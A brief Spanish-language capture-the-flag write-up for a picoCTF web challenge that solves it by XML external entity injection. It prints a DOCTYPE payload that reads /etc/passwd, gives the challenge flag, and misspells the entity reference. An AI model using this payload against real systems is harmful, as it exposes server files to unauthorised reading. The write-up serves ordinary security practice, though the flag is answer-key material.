## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:60581/)
## Solución
Se visita el sitio web y se aprecia que se cargan cosas a partir de botones
Con ayuda de burpsuite y buscando acerca de XML external entity Injection se obtiene que se puede usar 
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/etc/passwd"> ] >
```

Se cambia el ID por &xee

```
picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}
```
